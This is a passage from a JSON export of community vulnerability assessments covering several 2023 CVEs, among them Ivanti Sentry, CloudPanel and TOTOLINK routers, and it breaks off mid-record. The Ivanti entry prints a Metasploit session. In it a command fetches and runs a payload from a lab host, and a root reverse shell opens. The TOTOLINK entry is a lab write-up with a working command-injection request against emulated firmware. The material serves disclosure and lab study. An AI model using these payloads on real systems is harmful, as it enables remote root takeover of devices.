          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "5d511b80-38dc-4951-ad8c-202c22966812",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "c07c598d-6807-4629-9512-e3f6475dd4a4",
      "created": "2023-08-24T13:46:48.132008Z",
      "revisionDate": "2023-12-08T12:56:27.808942Z",
      "document": "CVE-2023-36884 is a fixed vulnerability that permitted remote code execution. Attackers could manipulate Microsoft Office files to bypass the Mark of the Web (MoTW) security mechanism. This bypass allowed these documents to be accessed without a security prompt, facilitating remote code execution. In response to the once-mitigated but still exploited CVE-2023-36884 weakness, Microsoft rolled out an Office Defense in Depth patch as part of August 2023 Patch Tuesday.\r\n\r\nThe Russian cyber group, Storm-0978/RomCom, has been actively exploiting this flaw.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "1ef16f4e-bf87-4b4a-89a8-b96e1c147656",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "bd9fdd86-916b-4cae-b672-8cb2a981f197",
      "created": "2023-08-29T22:04:58.758806Z",
      "revisionDate": "2024-02-11T22:31:49.534068Z",
      "document": "# Description\r\nIvanti Sentry (formerly MobileIron Sentry) is vulnerable to an authentication by-pass which exposes API functionality which allows for code execution in the context of the root user. The vulnerable endpoint `/mics/services/MICSLogService` exposes a binary web service protocol, Hessian, which allows remote users to invoke functions within the target Sentry system. \r\n\r\n\r\nOne of the functions accessible via Hessian and the vulnerable endpoint is `uploadFileUsingFileInput` which accepts a `command` argument that gets directly fed into a `Runtime.getRuntime().exec(cmd)` call. The command is run in the context of the `tomcat2` user however by default `tomcat2` is able to execute commands with sudo thus we can use this to execute the payload in the context of the `root` user.\r\n\r\n# Attacker Value and Exploitability\r\nFor attacker's this one is pretty juicy as it gives unauthenticated RCE in the context of the root users, it doesn't get much better than that. Seeing CVE-2023-38035 being added to the [KEV list](https://www.cisa.gov/news-events/alerts/2023/08/22/cisa-adds-two-known-exploited-vulnerabilities-catalog) only one day after it was published speaks volumes on the usefulness to malicious adversaries. To the attacker\u2019s benefit there aren\u2019t any definitive IoCs other than unrecognized HTTP requests to `/services/*` which should be cause for concern. The only saving grace is that a Shodan search for Ivanti Sentry targets on the internet only yielded around 500 vulnerable instances exposed at the time the vuln was disclosed. \r\n\r\n# Vulnerable Versions\r\nIvanti Sentry versions vulnerable to CVE-2023-38035:\r\n- =< 9.18.0\r\n\r\n# Vulnerable Environment\r\nA vulnerable MobileIron Sentry version 9.12.0-16 `.vhd` file can be downloaded from the following [URL](https://mobileironsentry.blob.core.windows.net/mobileironsentrycontainer/sentry-mobileiron-9.12.0-16.vhd)\r\n\r\n# Metasploit Module Demonstration\r\n```\r\nmsf6 > use linux/http/ivanti_sentry_misc_log_service\r\n[*] Using configured payload cmd/linux/http/x64/meterpreter_reverse_tcp\r\nmsf6 exploit(linux/http/ivanti_sentry_misc_log_service) > set rhosts 192.168.1.78\r\nrhosts => 192.168.1.78\r\nmsf6 exploit(linux/http/ivanti_sentry_misc_log_service) > set lhost 192.168.1.72\r\nlhost => 192.168.1.72\r\nmsf6 exploit(linux/http/ivanti_sentry_misc_log_service) > set fetch_srvhost 192.168.1.72\r\nfetch_srvhost => 192.168.1.72\r\nmsf6 exploit(linux/http/ivanti_sentry_misc_log_service) > set verbose true\r\nverbose => true\r\nmsf6 exploit(linux/http/ivanti_sentry_misc_log_service) > exploit\r\n[*] Reloading module...\r\n\r\n[*] Command to run on remote host: curl -so /tmp/ccrjHXsc http://192.168.1.72:8080/etRbFA76UzDRclkL8zrTdg; chmod +x /tmp/ccrjHXsc; /tmp/ccrjHXsc &\r\n[*] Fetch Handler listening on 192.168.1.72:8080\r\n[*] HTTP server started\r\n[*] Adding resource /etRbFA76UzDRclkL8zrTdg\r\n[*] Started reverse TCP handler on 192.168.1.72:4443\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] The target appears to be vulnerable.\r\n[*] Executing Unix (In-Memory) for cmd/linux/http/x64/meterpreter_reverse_tcp\r\n[*] Running the command: sudo curl -so /tmp/ccrjHXsc http://192.168.1.72:8080/etRbFA76UzDRclkL8zrTdg\r\n[*] Client 192.168.1.78 requested /etRbFA76UzDRclkL8zrTdg\r\n[*] Sending payload to 192.168.1.78 (curl/7.29.0)\r\n[*] Running the command: sudo  chmod +x /tmp/ccrjHXsc\r\n[*] Running the command: sudo  /tmp/ccrjHXsc &\r\n[*] Meterpreter session 6 opened (192.168.1.72:4443 -> 192.168.1.78:40550) at 2023-08-29 14:27:57 -0400\r\n\r\nmeterpreter > getuid\r\nServer username: root\r\nmeterpreter > sysinfo\r\nComputer     : localhost.localdomain\r\nOS           : CentOS 7.8.2003 (Linux 3.10.0-1160.el7.x86_64)\r\nArchitecture : x64\r\nBuildTuple   : x86_64-linux-musl\r\nMeterpreter  : x64/linux\r\nmeterpreter > exit\r\n\r\n```\r\n\r\n\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "fdd7e26b-ad6b-497d-ab19-b2fb38242224",
      "editorId": "09972bad-a652-42de-8af3-54014c7e3808",
      "topicId": "a758cd5a-4e34-4571-bfce-a06954542d9f",
      "created": "2023-08-30T05:38:32.952358Z",
      "revisionDate": "2023-08-30T05:38:32.951674Z",
      "document": "",
      "score": 1,
      "metadata": {
        "attacker-value": 5
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "5e54747e-4a98-449b-999d-4580f7c7d239",
      "editorId": "5e2d2d72-4160-4c96-9014-119b14a0ee5c",
      "topicId": "995276a2-d2be-4b18-8b51-8787cba11e00",
      "created": "2023-09-07T14:07:40.964954Z",
      "revisionDate": "2023-09-07T14:07:40.964823Z",
      "document": "This vulnerability causes a denial of service in applications that use the moment library in the vulnerable versions.\r\n\r\n- When it is a javascript application on node.js, the impact of the vulnerability is greater.\r\n\r\n- When the application only loads or uses the library on the frontend, the impact is less since the denial of service is local to the browser.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "ef6940a9-1716-430c-98a9-2e901ebeba5c",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "bfc8dbb1-82db-401c-baa3-7957c2515031",
      "created": "2023-09-13T07:35:25.749008Z",
      "revisionDate": "2023-09-13T07:35:25.750572Z",
      "document": "A significant vulnerability has been detected in CloudPanel. The root cause is attributed to the default secret keys' usage and the default user being set as \u201cclp\u201d.\r\n\r\nVulnerability Description:\r\n1. No Session Authentication: CloudPanel's file manager doesn't enforce session authentication, resulting in a broken access control mechanism.\r\n2. Cookie Manipulation: The vulnerability can be exploited when the encrypted value of the cookie named \"clp-fm\" is set using the default secret key. Upon decryption, this cookie's value is a serialized string.\r\n3. PHP Object Injection: Attackers can manipulate this decrypted serialized string to reset the user value to the default \"clp\". Combined with PHP Object Injection, this can lead to more severe attacks.\r\n4. Elevated Access: The vulnerability allows attackers to gain unrestricted access to the file manager, where they can then upload malicious files to the main CloudPanel directory. \r\n5. Privilege Escalation: The default \"clp\" user possesses 'sudo nopasswd' rights, leading to a potential privilege escalation. \r\n\r\nTechnical Flow of the attack:\r\n- The component `/home/clp/htdocs/app/files/public/file-manager/backend.php` receives the encrypted \"clp-fm\" cookie value.\r\n- Post decryption, the value is deserialized. Exploiting this step gives attackers opportunities for post-exploitation, such as Remote Code Execution and Local File Disclosures.\r\n- The deserialized value is utilized as an object \u2013 specifically to pass the 'user' value to the variable `$user`.\r\n- Authentication to the file manager merely requires the \"clp-fm\" cookie. Once the decrypted cookie is passed, it provides backend unrestricted access. From here, the attacker can gain \"clp\" user rights, which essentially means root access.\r\n\r\nIn conclusion, the use of default configurations, the lack of session authentication, and the capability to inject PHP objects cumulatively pose a severe threat, enabling attackers to gain root access in systems using CloudPanel.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "80bfc68e-c31d-4f04-aa5e-cb72f19f8b11",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "824ae6df-15f6-45f9-9219-efda6c397d6a",
      "created": "2023-09-13T12:28:26.343937Z",
      "revisionDate": "2023-09-15T09:12:29.783461Z",
      "document": "Zioncom (Hong Kong) Technology Limited is a professional manufacturer for network communication products, including Wireless Router/AP (Indoor & Outdoor) , 4G&5G Router, Wireless Extender, Wireless USB Adapter, Wireless Module, Switch and Wired Router.\r\nThey are launching a large portfolio their network products under the brand name TOTOLINK. Despite the fact that they are in the business of developing and designing network products, a lot of their solutions are flawed in terms of security. Dozens of their products and related firmware are subject to buffer overflows and command injections and this CVE is only one of the many out there.\r\n\r\nI took this CVE to the focus a bit more on the analysis of firmware and how you test your firmware without having the hardware actually in hand using firmware emulation.\r\n[Firmadyne](https://github.com/firmadyne/firmadyne) is one of most popular firmware analysis and emulation software and is available in the public domain where you can install it freely on your Linux distribution. Now before you jump in cloning the repository and start the installation, I want to outline two other firmware analysis and emulation tools that probably makes your life a bit easier. \r\nThe first one is [Firmware Analysis Toolkit (FAT)](https://github.com/attify/firmware-analysis-toolkit) which is basically a script to automate `Firmadyne`. If you do not want to bother with complex installation,  you can try [AttifyOS](https://github.com/adi0x90/attifyos) which has Firmware Analysis Toolkit and other tools pre-installed and ready to use.\r\nThe other tool that you can use is called [FirmAE](https://github.com/pr0v3rbs/FirmAE) which is a fully-automated framework that performs emulation and vulnerability analysis. `FirmAE` significantly increases the emulation success rate (From Firmadyne's 16.28% to 79.36%) with five arbitration techniques. \r\n\r\nIn my case, I settled for `FirmAE`, because it indeed increases the success rate of firmware emulation considerably. There is a very nice [Paper](https://syssec.kaist.ac.kr/pub/2020/kim_acsac2020.pdf) that explains the architecture and  techniques used and I would advice you to read this first before jumping into the installation and operation of the tool.\r\n\r\nOk let's go down to business and do some analysis and emulation with `FirmAE`. \r\nI installed `FirmAE` on my Kali Linux distribution (2023.4) using the installation instructions provided on the github page. To emulate the specific firmware that comes with the TOTOLINK X5000R, `binwalk` need to be able to handle a sasquatch filesystem which requires a bit of additional installation and compilation steps that you can find [here](https://gist.github.com/thanoskoutr/4ea24a443879aa7fc04e075ceba6f689). Please do not forget to run this after your `FirmAE` installation otherwise you will not be able to extract the firmware.\r\n\r\nOk, when everything is installed, let's download  the vulnerable firmware from TOTOLINK [here](https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/218/ids/36.html). We need `V9.1.0u.6118_B20201102` ~~and `V9.1.0u.6369_B20230113 `~~.\r\n\r\n**UPDATE 14 September 2023**\r\nI could not reproduce the exploit with X5000R firmware `V9.1.0u.6369_B20230113.rar`, so please use `V9.1.0u.6118_B20201102.zip` for your testing.\r\nI have also discovered other TOTOLINK firmware that is vulnerable for the same exploit.\r\n* Wireless Dual Band Gigabit Router model A7000R with firmware `A7000R_V9.1.0u.6115_B20201022.zip`\r\n* Wireless Dual Band Gigabit Router model A3700R with firmware `A3700R_V9.1.2u.6134_B20201202.zip`\r\n* Wireless N Router model N200RE V5 with firmware `N200RE_V5_V9.3.5u.6095_B20200916.zip` and `N200RE_V5_V9.3.5u.6139_B20201216.zip`\r\n* Wireless N Router model N350RT with firmware `N350RT_V9.3.5u.6095_B20200916.zip` and `N350RT_V9.3.5u.6139_B20201216.zip`\r\n* Wireless Extender model EX1200L with firmware `EX1200L_V9.3.5u.6146_B20201023.zip`\r\n* And probably more looking at the scale of impacted devices :-(\r\n\r\nWe are now ready to start the emulation. With `FirmAE`, you have different options such as a check option (-c) to see if your firmware can be emulated or a run option (-r) to emulate your firmware. I always use the debug option (-d) because it gives you the ability to access the firmware via a console for debugging and analysis purposes.\r\nFirst run `./init.sh` to start initialize the Postgress database.\r\nNow run the debug session by running the following command `./run.sh -d TOTOLINK X5000R_V9.1.0u.6118_B20201102.zip`\r\nThis will take a while, but in the end you should see the following... \r\n\r\n**TIP:** you can speed this up by setting the arbitrary option `FIRMAE_ETC` in `firmae.config` to false (however, not necessary to make below work).\r\n```ShellSession\r\n# ./run.sh -d TOTOLINK /root/FirmAE/firmwares/X5000R_V9.1.0u.6118_B20201102.zip\r\n[*] /root/FirmAE/firmwares/X5000R_V9.1.0u.6118_B20201102.zip emulation start!!!\r\n[*] extract done!!!\r\n[*] get architecture done!!!\r\nmke2fs 1.47.0 (5-Feb-2023)\r\nmknod: /dev/mem: File exists\r\nmknod: /dev/kmem: File exists\r\nmknod: /dev/null: File exists\r\nmknod: /dev/random: File exists\r\nmknod: /dev/urandom: File exists\r\nmknod: /dev/console: File exists\r\nmknod: /dev/ptmx: File exists\r\nmknod: /dev/ttyS0: File exists\r\nmknod: /dev/ttyS1: File exists\r\nmknod: /dev/ppp: File exists\r\nmknod: /dev/mtd0: File exists\r\nmknod: /dev/mtd1: File exists\r\nmknod: /dev/mtd2: File exists\r\nmknod: /dev/mtd3: File exists\r\nmknod: /dev/mtd4: File exists\r\nmknod: /dev/mtd5: File exists\r\nmknod: /dev/mtd6: File exists\r\nmknod: /dev/mtdblock0: File exists\r\nmknod: /dev/mtdblock1: File exists\r\nmknod: /dev/mtdblock2: File exists\r\nmknod: /dev/mtdblock3: File exists\r\nmknod: /dev/mtdblock4: File exists\r\nmknod: /dev/mtdblock5: File exists\r\nmknod: /dev/mtdblock6: File exists\r\ne2fsck 1.47.0 (5-Feb-2023)\r\n[*] infer network start!!!\r\n\r\n[IID] 1\r\n[MODE] debug\r\n[+] Network reachable on 192.168.0.1!\r\n[+] Run debug!\r\nCreating TAP device tap1_0...\r\nSet 'tap1_0' persistent and owned by uid 0\r\nBringing up TAP device...\r\nStarting emulation of firmware... None false false -1 -1\r\n/root/FirmAE/./debug.py:7: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13\r\n  import telnetlib\r\n[*] firmware - X5000R_V9.1.0u.6118_B20201102\r\n[*] IP - 192.168.0.1\r\n[*] connecting to netcat (192.168.0.1:31337)\r\n[-] failed to connect netcat\r\n------------------------------\r\n|       FirmAE Debugger      |\r\n------------------------------\r\n1. connect to socat\r\n2. connect to shell\r\n3. tcpdump\r\n4. run gdbserver\r\n5. file transfer\r\n6. exit \r\n```\r\nNow there is an issue that we need to fix first because the network connectivity from the host to the emulated firmware, which is basically a virtual machine, is not working. You can see this because `netcat` can not connect on 192.168.0.1 and pinging this IP is also not working. In order to fix this, use option `1. connect to socat` to access your running firmware and run below commands to check the network configuration.\r\n```ShellSession\r\n>1\r\n/ # brctl show\r\nbrctl show\r\nbridge name\tbridge id\t\tSTP enabled\tinterfaces\r\nbr0\t\t8000.525400123458\tyes\t\teth2\r\n/ # ifconfig -a\r\nifconfig -a\r\nbr0       Link encap:Ethernet  HWaddr 52:54:00:12:34:56\r\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\r\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:0\r\n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\r\n\r\neth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56\r\n          BROADCAST MULTICAST  MTU:1500  Metric:1\r\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:1000\r\n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\r\n\r\neth1      Link encap:Ethernet  HWaddr 52:54:00:12:34:57\r\n          BROADCAST MULTICAST  MTU:1500  Metric:1\r\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:1000\r\n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\r\n\r\neth2      Link encap:Ethernet  HWaddr 52:54:00:12:34:58\r\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\r\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:33 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:1000\r\n          RX bytes:0 (0.0 B)  TX bytes:1980 (1.9 KiB)\r\n\r\neth3      Link encap:Ethernet  HWaddr 52:54:00:12:34:59\r\n          BROADCAST MULTICAST  MTU:1500  Metric:1\r\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:1000\r\n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\r\n\r\nip6tnl0   Link encap:UNSPEC  HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00\r\n          NOARP  MTU:1452  Metric:1\r\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:0\r\n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\r\n\r\nlo        Link encap:Local Loopback\r\n          inet addr:127.0.0.1  Mask:255.0.0.0\r\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\r\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:0\r\n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\r\n\r\nsit0      Link encap:IPv6-in-IPv4\r\n          NOARP  MTU:1480  Metric:1\r\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:0\r\n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\r\n\r\ntunl0     Link encap:UNSPEC  HWaddr 00-00-00-00-D4-7F-2C-6A-00-00-00-00-00-00-00-00\r\n          NOARP  MTU:1480  Metric:1\r\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\r\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\r\n          collisions:0 txqueuelen:0\r\n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\r\n\r\n/ # \r\n```\r\nIn my case, there were two issues, first of all the bridge command showed `eth2` instead `eth0` and `br0` did not have any IP configured.\r\nTo fix this, run the following commands below to make the firmware accessible from the host.\r\n```ShellSession\r\n/ # brctl addif br0 eth0\r\nbrctl addif br0 eth0\r\n/ # brctl show\r\nbrctl show\r\nbridge name\tbridge id\t\tSTP enabled\tinterfaces\r\nbr0\t\t8000.525400123456\tyes\t\teth2\r\n\t\t\t\t\t\t\teth0\r\n/ # ifconfig eth0 up\r\nifconfig eth0 up\r\n/ # ifconfig br0 192.168.0.1 netmask 255.255.255.0 broadcast 192.168.0.255\r\nifconfig br0 192.168.0.1 netmask 255.255.255.0 broadcast 192.168.0.255\r\n/ #\r\n```\r\nYou should now be able to `ping` the network address 192.168.0.1 from your host and run a `nmap` command to check the services.\r\n```ShellSession\r\n# ping 192.168.0.1\r\nPING 192.168.0.1 (192.168.0.1) 56(84) bytes of data.\r\n64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=8.92 ms\r\n64 bytes from 192.168.0.1: icmp_seq=2 ttl=64 time=2.38 ms\r\n^C\r\n--- 192.168.0.1 ping statistics ---\r\n2 packets transmitted, 2 received, 0% packet loss, time 1001ms\r\nrtt min/avg/max/mdev = 2.384/5.650/8.916/3.266 ms\r\n# nmap 192.168.0.1\r\nStarting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 17:44 UTC\r\nNmap scan report for 192.168.0.1\r\nHost is up (0.011s latency).\r\nNot shown: 997 closed tcp ports (reset)\r\nPORT     STATE    SERVICE\r\n23/tcp   filtered telnet\r\n80/tcp   filtered http\r\n8080/tcp filtered http-proxy\r\nMAC Address: 52:54:00:12:34:56 (QEMU virtual NIC)\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 1.78 seconds\r\n```\r\n`nmap` shows that the web service is up and running on port 80 so it is time to dig into the vulnerability.\r\nReading the CVE, it talks about command insertion vulnerability in setting/setTracerouteCfg using the `command` parameter.\r\nMost of the functionality sits in the `/cgi-bin/cstecgi.cgi` file that you can find in the `www` directory at the emulated firmware. \r\n```ShellSession\r\n/www/cgi-bin # ls -l\r\nls -l\r\n-rwxrwxr-x    1 root     root           455 Nov  2  2020 ExportSettings.sh\r\n-rwxrwxr-x    1 root     root        251300 Nov  2  2020 cstecgi.cgi\r\nlrwxrwxrwx    1 root     root            15 Nov  2  2020 custom.cgi -> /tmp/custom.cgi\r\n/www/cgi-bin #\r\n```\r\nTo analyze, you can load this `IDA` or `Ghidra` to perform some reverse engineering.\r\nI will not dwell on this topic for now, but the vulnerable code resides in the decompiled function below shown in `Ghidra` where the parameter `command` is not properly escaped when it is executed using the `doSystem` command which is basically an OS command call to the underlying Linux OS.\r\n```c\r\nundefined4 FUN_0041f6a0(undefined4 param_1)\r\n\r\n{\r\n  undefined2 *param3;\r\n  undefined2 *__nptr;\r\n  int param2;\r\n  char acStack_90 [128];\r\n  \r\n  memset(acStack_90,0,0x80);\r\n  param3 = websGetVar(param_1,\"command\",(undefined2 *)\"www.baidu.com\");\r\n  __nptr = websGetVar(param_1,\"num\",(undefined2 *)0x437f70);\r\n  param2 = atoi((char *)__nptr);\r\n  sprintf(acStack_90,\"traceroute -m %d %s&>/var/log/traceRouteLog\",param2,(char *)param3);\r\n  doSystem(acStack_90);\r\n  setResponse(&DAT_00436104,\"reserv\",param2,param3);\r\n  return 1;\r\n}\r\n```\r\nBesides reverse engineering using `Ghidra` or `IDA`,  you can use the firmware analysis functionality provided by `FirmAE`. This is dynamic analysis using fuzzing and actually exploits from tools  like `Routersploit` to find vulnerable code.\r\n\r\nLet's quickly validate if our vulnerable emulated router is vulnerable by sending a malicious `POST` request with a manipulated `command` parameter using `burpsuite`.\r\n```html\r\nPOST /cgi-bin/cstecgi.cgi HTTP/1.1\r\nHost: 192.168.0.1\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0\r\nAccept: application/json, text/javascript, */*; q=0.01\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: 77\r\nOrigin: http://192.168.0.1\r\nConnection: close\r\n\r\n{\"command\":\"127.0.0.1; echo cuckoo >/tmp/cuckoo.txt;\",\"num\":\"200\",\"topicurl\":\"setTracerouteCfg\"}\r\n```\r\nBelow is a valid response.\r\n```html\r\nHTTP/1.1 200 OK\r\nConnection: close\r\nDate: Sun, 13 Sep 2015 16:37:50 GMT\r\nServer: lighttpd/1.4.20\r\nContent-Length: 234\r\n\r\ntraceroute to 127.0.0.1 (127.0.0.1), 200 hops max, 38 byte packets\r\n 1  localhost.localdomain (127.0.0.1)  4.842 ms  0.195 ms  0.192 ms\r\n{\r\n\t\"success\":\ttrue,\r\n\t\"error\":\tnull,\r\n\t\"lan_ip\":\t\"192.168.0.1\",\r\n\t\"wtime\":\t\"0\",\r\n\t\"reserv\":\t\"reserv\"\r\n}\r\n```\r\nHowever, it is a blind command injection because nothing is returned in the response with regards to a successful command execution.\r\nWe have to check this directly on the emulated firmware and as you can see is the file `/tmp/cuckoo.txt` successfully created.\r\n```ShellSession\r\n/tmp # ls -l *.txt\r\nls -l *.txt\r\n-rw-rw-rw-    1 root     root             7 Sep 13 16:37 cuckoo.txt\r\n/tmp # cat cuckoo.txt\r\ncat cuckoo.txt\r\ncuckoo\r\n/tmp #\r\n```\r\nA Metasploit module for this exploit is in development.\r\nYou can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/totolink_unauth_rce_cve_2023_30013.rb) in my local repository or as [PR 18365](https://github.com/rapid7/metasploit-framework/pull/18365) at the Metasploit Github development.\r\n\r\n### Mitigation\r\nYou should update your `TOTOLINK X5000R` router and other vulnerable TOTOLINK network devices listed in this article to the latest available firmware.\r\n\r\n### References\r\n[FirmAE](https://github.com/pr0v3rbs/FirmAE)\r\n[FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis](https://syssec.kaist.ac.kr/pub/2020/kim_acsac2020.pdf)\r\n[Firmware Analysis Toolkit (FAT)](https://github.com/attify/firmware-analysis-toolkit) \r\n[Firmadyne](https://github.com/firmadyne/firmadyne)\r\n[CVE-2023-30013](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-30013)\r\n[TOTOLINK Unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/totolink_unauth_rce_cve_2023_30013.rb)\r\n[Metasploit PR 18365](https://github.com/rapid7/metasploit-framework/pull/18365)\r\n[TOTOLINK X5000R Firmware](https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/218/ids/36.html)\r\n\r\n### Credits\r\n[Kazamayc](https://github.com/Kazamayc)\r\nAnd to all other good fellows who raised this concern ;-)\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
